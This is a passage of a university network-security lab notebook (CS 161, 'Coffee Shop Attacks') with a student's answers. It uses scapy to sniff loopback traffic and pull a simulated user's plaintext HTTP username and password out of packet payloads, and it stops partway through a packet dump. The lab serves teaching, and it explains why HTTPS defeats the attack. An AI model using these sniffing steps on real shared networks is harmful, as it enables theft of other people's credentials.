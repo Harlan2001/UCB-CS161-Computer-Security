{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# CS 161: Network Security Lab\n",
    "v1.0 Shomil Jain."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Hey! Welcome to the world of network security. In this lab, you'll have a chance to apply some of the concepts you've learned over the past few week. This lab has two parts.\n",
    "1. **Part 1:** Coffee Shop Attacks [TCP/IP, TLS]\n",
    "2. **Part 2:** Other Networking Topics [DNS, DNSSec]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**<h3>This lab also requires you to be a root user on your local computer.</h3>**\n",
    "If you didn't launch this notebook as root , quit & re-launch the notebook using the following command: `sudo jupyter notebook --allow-root`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "\n",
    "# Environment Setup\n",
    "\n",
    "This lab requires the Python `flask`, `scapy`, and `requests` modules. `scapy` should work out-of-the-box for MacOS; if you're using a Linux or Windows device, you may need to follow additional platform-specific versions available [here](https://scapy.readthedocs.io/en/latest/installation.html#platform-specific-instructions), such as installing `tcpdump`, if applicable. If you're unable to get `scapy` working, please check the [FAQ's](https://docs.google.com/document/d/1FWNH1TqVD9aXqfcGrbE6o0xaJEuPrjQMhgPJMuQ5oLM/edit) or make a Piazza post!\n",
    "<br>\n",
    "<br>\n",
    "**Run the following code block to install the required modules:**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-04-17T08:27:53.278533Z",
     "start_time": "2021-04-17T08:27:40.905324Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: flask in /Users/apple/anaconda3/lib/python3.7/site-packages (1.1.2)\n",
      "Collecting scapy\n",
      "  Downloading scapy-2.4.4.tar.gz (1.0 MB)\n",
      "\u001b[K     |████████████████████████████████| 1.0 MB 847 kB/s eta 0:00:01\n",
      "\u001b[?25hRequirement already satisfied: requests in /Users/apple/anaconda3/lib/python3.7/site-packages (2.24.0)\n",
      "Requirement already satisfied: itsdangerous>=0.24 in /Users/apple/anaconda3/lib/python3.7/site-packages (from flask) (1.1.0)\n",
      "Requirement already satisfied: Jinja2>=2.10.1 in /Users/apple/anaconda3/lib/python3.7/site-packages (from flask) (2.11.1)\n",
      "Requirement already satisfied: Werkzeug>=0.15 in /Users/apple/anaconda3/lib/python3.7/site-packages (from flask) (1.0.1)\n",
      "Requirement already satisfied: click>=5.1 in /Users/apple/anaconda3/lib/python3.7/site-packages (from flask) (7.1.1)\n",
      "Requirement already satisfied: MarkupSafe>=0.23 in /Users/apple/anaconda3/lib/python3.7/site-packages (from Jinja2>=2.10.1->flask) (1.1.1)\n",
      "Requirement already satisfied: idna<3,>=2.5 in /Users/apple/anaconda3/lib/python3.7/site-packages (from requests) (2.9)\n",
      "Requirement already satisfied: urllib3!=1.25.0,!=1.25.1,<1.26,>=1.21.1 in /Users/apple/anaconda3/lib/python3.7/site-packages (from requests) (1.25.11)\n",
      "Requirement already satisfied: certifi>=2017.4.17 in /Users/apple/anaconda3/lib/python3.7/site-packages (from requests) (2020.6.20)\n",
      "Requirement already satisfied: chardet<4,>=3.0.2 in /Users/apple/anaconda3/lib/python3.7/site-packages (from requests) (3.0.4)\n",
      "Building wheels for collected packages: scapy\n",
      "  Building wheel for scapy (setup.py) ... \u001b[?25ldone\n",
      "\u001b[?25h  Created wheel for scapy: filename=scapy-2.4.4-py2.py3-none-any.whl size=1189183 sha256=c3faebe1e7bfce3b13d9d076b2e16539c2e34e24abed1da07c130b013808c26f\n",
      "  Stored in directory: /Users/apple/Library/Caches/pip/wheels/ca/7c/fd/bc0de3490869ce4a371d8a6bf315ebbe3763d14c1b96b1afd0\n",
      "Successfully built scapy\n",
      "Installing collected packages: scapy\n",
      "Successfully installed scapy-2.4.4\n"
     ]
    }
   ],
   "source": [
    "!pip install flask scapy requests"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Network Interface\n",
    "This lab simulates connections between a client & server running on your local interface. The default values for these are in the comments below, but your specific `loopback` / `LAN` interface might be different. Try the values specified below, but if they don't work, refer to the [FAQ's](https://docs.google.com/document/d/1FWNH1TqVD9aXqfcGrbE6o0xaJEuPrjQMhgPJMuQ5oLM/edit?usp=sharing) or make a Piazza Post."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-04-17T08:28:28.597342Z",
     "start_time": "2021-04-17T08:28:28.590033Z"
    }
   },
   "outputs": [],
   "source": [
    "# TODO: Set the value below based on your platform.\n",
    "\n",
    "# MacOS: 'lo0'\n",
    "# Linux: 'lo'\n",
    "# Windows: 'Run ipconfig / all in a terminal window & copy your Wireless LAN Interface description value here.'\n",
    "\n",
    "NETWORK_INTERFACE = 'lo0'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To test if scapy is set up correctly, run the following cells. If you see an error, your network interface might be incorrect, or you might need to re-run this notebook as a root user (`sudo jupyter notebook`)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-04-17T08:28:22.436376Z",
     "start_time": "2021-04-17T08:28:21.482810Z"
    }
   },
   "outputs": [],
   "source": [
    "from scapy.all import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-04-17T08:28:44.169663Z",
     "start_time": "2021-04-17T08:28:44.157405Z"
    },
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Sniffed: TCP:1 UDP:0 ICMP:0 Other:0>"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sniff(iface=NETWORK_INTERFACE, count=1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**If you see `<Sniffed: ...>` above, you're ready to proceed!**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If you see an error, either try doing a quick Google Search to diagnose your problem, or make a Piazza post with details about your system (i.e. Mac/Windows/Linux)."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Part 1: Coffee Shop Attacks"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Preface\n",
    "\n",
    "Imagine you're sitting at a coffee shop. You connect to the coffee shop's public, shared WiFi network. You notice that EvanBot is also at the coffee shop – and connected to the same network. We'd like to explore the following questions:\n",
    "- How much of EvanBot's browsing activity can we monitor by simply being on the same WiFi network? \n",
    "- Can we interrupt his activity in any way?\n",
    "- What can EvanBot do to protect himself?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Quick Review: Packets\n",
    "\n",
    "A **Network Packet** is an atomic unit of structured communication. Packets contain a **Header** and a **Payload**.\n",
    "\n",
    "\n",
    "The protocols for sending information over the internet follow a layered structure. Our interpretation of these layers closely follows the [OSI 7-Layer Model](https://en.wikipedia.org/wiki/OSI_model). The three layers that we're going to explore in this lab are the Application Layer, the Transport Layer, and the Network Layer.\n",
    "- **Application Layer**: the human-readable context you want to send (i.e. HTML, JSON, etc.)\n",
    "- **Transport Layer**: this creates an end-to-end connection between the source & destination servers (i.e. UDP, TCP)\n",
    "- **Network Layer**: this finds routes through the internet to actually send messages (i.e. IP)\n",
    "\n",
    "<img style=\"float: left;\" src=\"images/layers.png\" width=\"250\">"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Quick Review: HTTP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "**HTTP (Hypertext Transfer Protocol)** is an Application Layer protocol that websites and apps use to communicate with servers and databases. Just like the other layers, HTTP Packets are encapsulated in the layer below – the Transport layer. They also have headers and (optionally) payloads – check out the examples below.\n",
    "\n",
    "#### GET Requests are used to request data from a server.\n",
    "```\n",
    "GET / HTTP/1.1\n",
    "Host: squigler.com\n",
    "Dnt: 1\n",
    "```\n",
    "\n",
    "#### POST Requests are used to upload data to a server.\n",
    "```\n",
    "POST /login HTTP/1.1\n",
    "Host: squigler.com\n",
    "Content-Length: 40\n",
    "Content-Type: application/x-url-formencoded\n",
    "Dnt: 1\n",
    "\n",
    "{\"username\": \"Alice\", \"password\": \"1234\"}\n",
    "```\n",
    "\n",
    "In the first example, the GET Request contains an empty payload; all the information needed to process the request is in the header. In the second example, the POST Request contains a JSON (dictionary) payload. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Attack #1: Sniff Insecure Network Traffic"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "EvanBot decides to log in to his CalCentral Account at http://calcentral.berkeley.edu. Can we see his username and password? **Note: he's using HTTP, not HTTPS. Why does that matter?**\n",
    "<br/>\n",
    "<br/>\n",
    "When EvanBot submits his login information via CalCentral, his browser makes a POST Request to http://calcentral.berkeley.edu/api/login with his username and password attached in the data payload. Take a look at the client-side logic (runs on EvanBot's browser) and the server-side logic (runs on the CalCentral server) below.\n",
    "***\n",
    "### Client-Side Logic\n",
    "```Python\n",
    "def handle_login_button_clicked():\n",
    "    # Make a POST Request to CalCentral, containing the entered username/password.\n",
    "    success = requests.post('http://calcentral.berkeley.edu/api/login', \n",
    "                            data=json.dumps({\n",
    "                                'username': page.get('username'),\n",
    "                                'password': page.get('password')\n",
    "                            })).json()\n",
    "    \n",
    "    # Check the value of the response.\n",
    "    if success.get('success') == True:\n",
    "        print(\"Login completed successfully!\")\n",
    "    else:\n",
    "        print(\"Username or password was incorrect.\")\n",
    "```\n",
    "***\n",
    "### Server-Side Logic\n",
    "```Python\n",
    "# Handle the POST Request on the server.\n",
    "@app.route('/api/login', methods=['POST'])\n",
    "def login_user():\n",
    "    username = request.form.get('username', '')\n",
    "    password = request.form.get('password', '')\n",
    "    \n",
    "    # Check if evanbot's username and password are valid.\n",
    "    if username == 'HIDDEN' and password == 'HIDDEN':\n",
    "        success = True\n",
    "    else:\n",
    "        success = False\n",
    "        \n",
    "    return success\n",
    "```\n",
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Simulate a Login Event & Capture Packets"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this attack, our goal is to simulate an on-path attacker. We're going to wait for EvanBot to log in - and then try to steal his login credentials, which are sent as plaintext over the insecure TCP connection."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Instructions:**\n",
    "Open up two terminal windows. We'll refer to them as **T1** and **T2**. In both windows, change directory to the attack1 folder (`cd attack1`).\n",
    "\n",
    "_(If you're using a virtual environment, make sure both windows also run in the same environment)_\n",
    "\n",
    "1. **In Notebook**: Start sniffing for packets by running the cell below.\n",
    "2. **In T1**: start the web server by running `python app.py --port 1616`\n",
    "3. **In T2**: Simulate a login event by running `python login.py --port 1616` (in a separate terminal window)\n",
    "4. After packets show up in this cell's output, stop the cell and proceed!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-04-17T08:59:39.389704Z",
     "start_time": "2021-04-17T08:59:34.650471Z"
    },
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Starting network sniffing. Now, simulate a login event.\n",
      "Collected 1 packets.\n",
      "Collected 2 packets.\n",
      "Collected 3 packets.\n",
      "Collected 4 packets.\n",
      "Collected 5 packets.\n",
      "Collected 6 packets.\n",
      "Collected 7 packets.\n",
      "Collected 8 packets.\n",
      "Collected 9 packets.\n",
      "Collected 10 packets.\n",
      "Collected 11 packets.\n",
      "Collected 12 packets.\n",
      "Collected 13 packets.\n",
      "Collected 14 packets.\n",
      "Collected 15 packets.\n",
      "Collected 16 packets.\n",
      "Collected 17 packets.\n",
      "Collected 18 packets.\n",
      "Collected 19 packets.\n",
      "Collected 20 packets.\n",
      "Collected 21 packets.\n",
      "Collected 22 packets.\n",
      "Collected 23 packets.\n",
      "Collected 24 packets.\n",
      "Collected 25 packets.\n",
      "Collected 26 packets.\n",
      "Collected 27 packets.\n",
      "Collected 28 packets.\n",
      "Collected 29 packets.\n",
      "Collected 30 packets.\n",
      "Collected 31 packets.\n",
      "Collected 32 packets.\n",
      "Collected 33 packets.\n",
      "Collected 34 packets.\n",
      "Collected 35 packets.\n",
      "Collected 36 packets.\n",
      "Collected 37 packets.\n",
      "Collected 38 packets.\n",
      "Collected 39 packets.\n",
      "Collected 40 packets.\n",
      "Collected 41 packets.\n",
      "Collected 42 packets.\n",
      "Collected 43 packets.\n",
      "Collected 44 packets.\n",
      "Collected 45 packets.\n",
      "Collected 46 packets.\n",
      "Collected 47 packets.\n",
      "Collected 48 packets.\n",
      "Collected 49 packets.\n",
      "Collected 50 packets.\n",
      "Collected 51 packets.\n",
      "Collected 52 packets.\n",
      "Collected 53 packets.\n",
      "Collected 54 packets.\n",
      "Collected 55 packets.\n",
      "Collected 56 packets.\n",
      "Collected 57 packets.\n",
      "Collected 58 packets.\n",
      "Collected 59 packets.\n",
      "Collected 60 packets.\n",
      "Collected 61 packets.\n",
      "Collected 62 packets.\n",
      "Collected 63 packets.\n",
      "Collected 64 packets.\n",
      "Collected 65 packets.\n",
      "Collected 66 packets.\n",
      "Collected 67 packets.\n",
      "Collected 68 packets.\n",
      "Collected 69 packets.\n",
      "Collected 70 packets.\n",
      "Collected 71 packets.\n",
      "Collected 72 packets.\n",
      "Collected 73 packets.\n",
      "Collected 74 packets.\n",
      "Collected 75 packets.\n",
      "Collected 76 packets.\n",
      "Collected 77 packets.\n",
      "Collected 78 packets.\n",
      "Collected 79 packets.\n",
      "Collected 80 packets.\n",
      "Collected 81 packets.\n",
      "Collected 82 packets.\n",
      "Collected 83 packets.\n",
      "Collected 84 packets.\n",
      "Collected 85 packets.\n",
      "Collected 86 packets.\n",
      "Collected 87 packets.\n",
      "Collected 88 packets.\n",
      "Collected 89 packets.\n",
      "Collected 90 packets.\n",
      "Collected 91 packets.\n",
      "Collected 92 packets.\n",
      "Collected 93 packets.\n",
      "Collected 94 packets.\n",
      "Collected 95 packets.\n",
      "Collected 96 packets.\n",
      "Collected 97 packets.\n",
      "Collected 98 packets.\n",
      "Collected 99 packets.\n",
      "Collected 100 packets.\n",
      "Collected 101 packets.\n",
      "Collected 102 packets.\n",
      "Collected 103 packets.\n",
      "Collected 104 packets.\n",
      "Collected 105 packets.\n",
      "Collected 106 packets.\n",
      "Collected 107 packets.\n",
      "Collected 108 packets.\n",
      "Collected 109 packets.\n",
      "Collected 110 packets.\n",
      "Collected 111 packets.\n",
      "Collected 112 packets.\n",
      "Collected 113 packets.\n",
      "Collected 114 packets.\n",
      "Collected 115 packets.\n",
      "Collected 116 packets.\n",
      "Collected 117 packets.\n",
      "Collected 118 packets.\n",
      "Collected 119 packets.\n",
      "Collected 120 packets.\n",
      "Collected 121 packets.\n",
      "Collected 122 packets.\n",
      "Collected 123 packets.\n",
      "Collected 124 packets.\n",
      "Collected 125 packets.\n",
      "Collected 126 packets.\n",
      "Collected 127 packets.\n",
      "Collected 128 packets.\n",
      "Collected 129 packets.\n",
      "Collected 130 packets.\n",
      "Collected 131 packets.\n",
      "Collected 132 packets.\n",
      "Collected 133 packets.\n",
      "Collected 134 packets.\n",
      "Collected 135 packets.\n",
      "Collected 136 packets.\n",
      "Collected 137 packets.\n",
      "Collected 138 packets.\n",
      "Collected 139 packets.\n",
      "Collected 140 packets.\n",
      "Collected 141 packets.\n",
      "Collected 142 packets.\n",
      "Collected 143 packets.\n",
      "Collected 144 packets.\n",
      "Collected 145 packets.\n",
      "Collected 146 packets.\n",
      "Collected 147 packets.\n",
      "Collected 148 packets.\n",
      "Collected 149 packets.\n",
      "Collected 150 packets.\n",
      "Collected 151 packets.\n",
      "Collected 152 packets.\n",
      "Collected 153 packets.\n",
      "Collected 154 packets.\n",
      "Collected 155 packets.\n",
      "Collected 156 packets.\n",
      "Collected 157 packets.\n",
      "Collected 158 packets.\n",
      "Collected 159 packets.\n",
      "Collected 160 packets.\n",
      "Collected 161 packets.\n",
      "Collected 162 packets.\n",
      "Collected 163 packets.\n",
      "Collected 164 packets.\n",
      "Collected 165 packets.\n",
      "Collected 166 packets.\n",
      "Collected 167 packets.\n",
      "Collected 168 packets.\n",
      "Collected 169 packets.\n",
      "Collected 170 packets.\n",
      "Collected 171 packets.\n",
      "Collected 172 packets.\n",
      "Collected 173 packets.\n",
      "Collected 174 packets.\n",
      "Collected 175 packets.\n",
      "Collected 176 packets.\n",
      "Collected 177 packets.\n",
      "Collected 178 packets.\n",
      "Collected 179 packets.\n",
      "Collected 180 packets.\n",
      "Collected 181 packets.\n",
      "Collected 182 packets.\n",
      "Collected 183 packets.\n",
      "Collected 184 packets.\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "<Sniffed: TCP:184 UDP:0 ICMP:0 Other:0>"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# After following the instructions above, you should see several \n",
    "# packets show up underneath this cell\n",
    "\n",
    "packets = []\n",
    "\n",
    "def print_packet(packet):\n",
    "    global packets\n",
    "    packets.append(packet)\n",
    "    print(f'Collected {len(packets)} packets.')\n",
    "\n",
    "print(\"Starting network sniffing. Now, simulate a login event.\")\n",
    "sniff(filter=\"port 4560\", prn=print_packet, iface=NETWORK_INTERFACE)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***\n",
    "## 1.1\n",
    "* **How many TCP packets did you collect in one simulated login event? UDP packets?**\n",
    "* **How many packets contained payloads? (A packet that contains a Payload has a \"Raw\" layer.**\n",
    "* **How many bytes did the server send to the client?**\n",
    "* **How many bytes did the client send to the server?**\n",
    "\n",
    "Note: you can access the packets sniffed above using the `packets` array. Use `packet.summary()` to see a summary of the packet.\n",
    "\n",
    "_Hint: The python `len` function returns the total size (# bytes) of a packet._\n",
    "<br>\n",
    "_Hint: to differentiate server & client, look at the HTTP Payloads, or consider which of the two initiated the connection._\n",
    "***"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-04-17T09:10:11.978419Z",
     "start_time": "2021-04-17T09:10:11.967144Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "18\n",
      "client -> server : 739 bytes in total\n",
      "server -> client : 695 bytes in total\n"
     ]
    }
   ],
   "source": [
    "useful_packets = []\n",
    "server_payloads = 0\n",
    "client_payloads = 0\n",
    "for packet in packets:\n",
    "    if packet.payload.dport == 4560:\n",
    "        useful_packets.append(packet)\n",
    "        client_payloads += len(packet)\n",
    "    elif packet.payload.sport == 4560:\n",
    "        useful_packets.append(packet)\n",
    "        server_payloads += len(packet)\n",
    "print(len(useful_packets))\n",
    "print(f\"client -> server : {client_payloads} bytes in total\")\n",
    "print(f\"server -> client : {server_payloads} bytes in total\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-04-17T09:03:52.095874Z",
     "start_time": "2021-04-17T09:03:52.088229Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Loopback / IP / TCP 127.0.0.1:57629 > 127.0.0.1:4560 S\n",
      "Loopback / IP / TCP 127.0.0.1:4560 > 127.0.0.1:57629 SA\n",
      "Loopback / IP / TCP 127.0.0.1:57629 > 127.0.0.1:4560 A\n",
      "Loopback / IP / TCP 127.0.0.1:4560 > 127.0.0.1:57629 A\n",
      "Loopback / IP / TCP 127.0.0.1:57629 > 127.0.0.1:4560 PA / Raw\n",
      "Loopback / IP / TCP 127.0.0.1:57629 > 127.0.0.1:4560 PA / Raw\n",
      "Loopback / IP / TCP 127.0.0.1:4560 > 127.0.0.1:57629 A\n",
      "Loopback / IP / TCP 127.0.0.1:4560 > 127.0.0.1:57629 A\n",
      "Loopback / IP / TCP 127.0.0.1:4560 > 127.0.0.1:57629 PA / Raw\n",
      "Loopback / IP / TCP 127.0.0.1:57629 > 127.0.0.1:4560 A\n",
      "Loopback / IP / TCP 127.0.0.1:4560 > 127.0.0.1:57629 PA / Raw\n",
      "Loopback / IP / TCP 127.0.0.1:57629 > 127.0.0.1:4560 A\n",
      "Loopback / IP / TCP 127.0.0.1:4560 > 127.0.0.1:57629 PA / Raw\n",
      "Loopback / IP / TCP 127.0.0.1:57629 > 127.0.0.1:4560 A\n",
      "Loopback / IP / TCP 127.0.0.1:4560 > 127.0.0.1:57629 FA\n",
      "Loopback / IP / TCP 127.0.0.1:57629 > 127.0.0.1:4560 A\n",
      "Loopback / IP / TCP 127.0.0.1:57629 > 127.0.0.1:4560 FA\n",
      "Loopback / IP / TCP 127.0.0.1:4560 > 127.0.0.1:57629 A\n"
     ]
    }
   ],
   "source": [
    "# TODO: YOUR CODE HERE [to answer Checkpoint Question 1.1]\n",
    "for packet in useful_packets:\n",
    "    print(packet.summary())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-04-17T09:05:58.696611Z",
     "start_time": "2021-04-17T09:05:58.689153Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'E\\x00\\x00\\xe3\\x00\\x00@\\x00@\\x06\\x00\\x00\\x7f\\x00\\x00\\x01\\x7f\\x00\\x00\\x01\\xe1\\x1d\\x11\\xd0\\xb0\\xd3n\\x16\\xd7\\x12\\x08y\\x80\\x18\\x18\\xeb\\xfe\\xd7\\x00\\x00\\x01\\x01\\x08\\nQ\\x7f\\x93\\xb7Q\\x7f\\x93\\xb7POST /api/login HTTP/1.1\\r\\nHost: 127.0.0.1:4560\\r\\nUser-Agent: python-requests/2.24.0\\r\\nAccept-Encoding: gzip, deflate\\r\\nAccept: */*\\r\\nConnection: keep-alive\\r\\nContent-Length: 48\\r\\n\\r\\n'\n",
      "b'E\\x00\\x00d\\x00\\x00@\\x00@\\x06\\x00\\x00\\x7f\\x00\\x00\\x01\\x7f\\x00\\x00\\x01\\xe1\\x1d\\x11\\xd0\\xb0\\xd3n\\xc5\\xd7\\x12\\x08y\\x80\\x18\\x18\\xeb\\xfeX\\x00\\x00\\x01\\x01\\x08\\nQ\\x7f\\x93\\xb7Q\\x7f\\x93\\xb7{\"username\": \"evanbot\", \"password\": \"bot>human\"}'\n"
     ]
    }
   ],
   "source": [
    "# client => server\n",
    "print(useful_packets[4].payload)\n",
    "print(useful_packets[5].payload)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-04-17T09:06:48.042172Z",
     "start_time": "2021-04-17T09:06:48.027070Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'E\\x00\\x00E\\x00\\x00@\\x00@\\x06\\x00\\x00\\x7f\\x00\\x00\\x01\\x7f\\x00\\x00\\x01\\x11\\xd0\\xe1\\x1d\\xd7\\x12\\x08y\\xb0\\xd3n\\xf5\\x80\\x18\\x18\\xe8\\xfe9\\x00\\x00\\x01\\x01\\x08\\nQ\\x7f\\x93\\xbbQ\\x7f\\x93\\xb7HTTP/1.0 200 OK\\r\\n'\n",
      "b'E\\x00\\x00\\xb4\\x00\\x00@\\x00@\\x06\\x00\\x00\\x7f\\x00\\x00\\x01\\x7f\\x00\\x00\\x01\\x11\\xd0\\xe1\\x1d\\xd7\\x12\\x08\\x8a\\xb0\\xd3n\\xf5\\x80\\x18\\x18\\xe8\\xfe\\xa8\\x00\\x00\\x01\\x01\\x08\\nQ\\x7f\\x93\\xbcQ\\x7f\\x93\\xbbContent-Type: application/json\\r\\nContent-Length: 34\\r\\nServer: Werkzeug/1.0.1 Python/3.7.7\\r\\nDate: Sat, 17 Apr 2021 08:59:37 GMT\\r\\n\\r\\n'\n",
      "b'E\\x00\\x00V\\x00\\x00@\\x00@\\x06\\x00\\x00\\x7f\\x00\\x00\\x01\\x7f\\x00\\x00\\x01\\x11\\xd0\\xe1\\x1d\\xd7\\x12\\t\\n\\xb0\\xd3n\\xf5\\x80\\x18\\x18\\xe8\\xfeJ\\x00\\x00\\x01\\x01\\x08\\nQ\\x7f\\x93\\xbcQ\\x7f\\x93\\xbc{\"success\":\"Incorrect password!\"}\\n'\n"
     ]
    }
   ],
   "source": [
    "# server => client\n",
    "print(useful_packets[8].payload)\n",
    "print(useful_packets[10].payload)\n",
    "print(useful_packets[12].payload)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**<span style = \"color: red\">\n",
    "    1. How many TCP packets did you collect in one simulated login event? 18\n",
    "       UDP packets? 0\n",
    "    2. How many packets contained payloads? 5 \n",
    "    3. How many bytes did the server send to the client? 695\n",
    "    4. How many bytes did the client send to the server? 739\n",
    "</span>**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 1.2\n",
    "Take a closer look at the first packet (hint: use `packet.show()` to show the structure of the packet).\n",
    "* **What is the TTL of this packet?**\n",
    "* **What are the source & destination addresses of the IP layer?**\n",
    "* **What is the SEQ and ACK numbers of the TCP layer?**\n",
    "***"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-04-17T09:11:27.873143Z",
     "start_time": "2021-04-17T09:11:27.867191Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "###[ Loopback ]### \n",
      "  type      = IPv4\n",
      "###[ IP ]### \n",
      "     version   = 4\n",
      "     ihl       = 5\n",
      "     tos       = 0x0\n",
      "     len       = 64\n",
      "     id        = 0\n",
      "     flags     = DF\n",
      "     frag      = 0\n",
      "     ttl       = 64\n",
      "     proto     = tcp\n",
      "     chksum    = 0x0\n",
      "     src       = 127.0.0.1\n",
      "     dst       = 127.0.0.1\n",
      "     \\options   \\\n",
      "###[ TCP ]### \n",
      "        sport     = 57629\n",
      "        dport     = 4560\n",
      "        seq       = 2966646293\n",
      "        ack       = 0\n",
      "        dataofs   = 11\n",
      "        reserved  = 0\n",
      "        flags     = S\n",
      "        window    = 65535\n",
      "        chksum    = 0xfe34\n",
      "        urgptr    = 0\n",
      "        options   = [('MSS', 16344), ('NOP', None), ('WScale', 6), ('NOP', None), ('NOP', None), ('Timestamp', (1367315383, 0)), ('SAckOK', b''), ('EOL', None)]\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# TODO: YOUR CODE HERE [to answer Checkpoint Question 1.2]\n",
    "useful_packets[0].show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**<span style = \"color: red\">\n",
    "    TTL: 64\n",
    "    source IP : 127.0.0.1\n",
    "    dest IP : 127.0.0.1\n",
    "    SEQ : 2966646293\n",
    "    ACK : 0\n",
    "</span>**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Extract the Payload and Response from this TCP Connection\n",
    "Up to this point, we've analyzed the Network (IP) and Transport (TCP) layers. In order to extract EvanBot's login credentials, we need to analyze the Application (HTTP) layer.\n",
    "\n",
    "This layer is contained within the payload of a handful of packets within the TCP sequence. After the TCP connection is established, the HTTP Layer can send and receive data through the payload of the TCP connection. In our packet structure, this shows up as the \"Raw\" payloads."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***\n",
    "## 1.3\n",
    "Find the packet that contains EvanBot's username and password. \n",
    "\n",
    "*Hint: use packet.show() to show the structure of the packet. Look at the RAW (payload) section of the packet, if it exists. Not all packets contain payloads. To print the payload, use `packet[TCP].payload`.*\n",
    "\n",
    "* **What user agent did the HTTP request originate from?**\n",
    "* **What are EvanBot's username and password?**\n",
    "* **Were the username/password combination correct?**\n",
    "* **This attack wouldn't work if Evanbot was using HTTPS. Why?**\n",
    "* **This attack wouldn't work if we weren't on-path. Why?**\n",
    "***"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2021-04-17T09:15:20.093783Z",
     "start_time": "2021-04-17T09:15:20.084615Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'E\\x00\\x00d\\x00\\x00@\\x00@\\x06\\x00\\x00\\x7f\\x00\\x00\\x01\\x7f\\x00\\x00\\x01\\xe1\\x1d\\x11\\xd0\\xb0\\xd3n\\xc5\\xd7\\x12\\x08y\\x80\\x18\\x18\\xeb\\xfeX\\x00\\x00\\x01\\x01\\x08\\nQ\\x7f\\x93\\xb7Q\\x7f\\x93\\xb7{\"username\": \"evanbot\", \"password\": \"bot>human\"}'\n",
      "###[ Loopback ]### \n",
      "  type      = IPv4\n",
      "###[ IP ]### \n",
      "     version   = 4\n",
      "     ihl       = 5\n",
      "     tos       = 0x0\n",
      "     len       = 100\n",
      "     id        = 0\n",
      "     flags     = DF\n",
      "     frag      = 0\n",
      "     ttl       = 64\n",
      "     proto     = tcp\n",
      "     chksum    = 0x0\n",
